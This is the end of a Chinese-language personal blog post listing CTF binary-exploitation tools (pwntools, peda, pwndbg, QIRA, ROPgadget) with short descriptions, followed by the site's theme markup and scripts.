<p>查看程序的基本信息，主要查看程序开启了什么保护。</p>
<h4 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a><a href="https://github.com/Gallopsled/pwntools">pwntools</a></h4><p>Pwntools是一个CTF框架和漏洞利用开发库。它是用Python编写的，旨在用于快速原型开发和开发，旨在使漏洞利用程序编写尽可能简单。</p>
<h4 id="peda"><a href="#peda" class="headerlink" title="peda"></a><a href="https://github.com/longld/peda">peda</a></h4><p>PEDA-GDB的Python漏洞利用开发协助。和pwndbg冲突，通过修改.gdbinit文件切换。</p>
<h4 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a><a href="https://github.com/pwndbg/pwndbg">pwndbg</a></h4><p>pwndbg是一个GDB插件，它使使用GDB进行调试的工作量减少，重点放在低级软件开发人员，硬件黑客，逆向工程人员和漏洞利用开发人员所需的功能上。</p>
<h4 id="QIRA"><a href="#QIRA" class="headerlink" title="QIRA"></a><a href="http://qira.me/" target="_blank" rel="noopener">QIRA</a></h4><p>程序运行时跟踪调试工具。</p>
<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a><a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></h4><p>使用此工具，您可以在二进制文件中搜索，以方便您对ROP的利用。ROPgadget在x86，x64，ARM，ARM64，PowerPC，SPARC和MIPS体系结构上支持ELF / PE / Mach-O格式。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">s0nnse</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">s0nnse</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
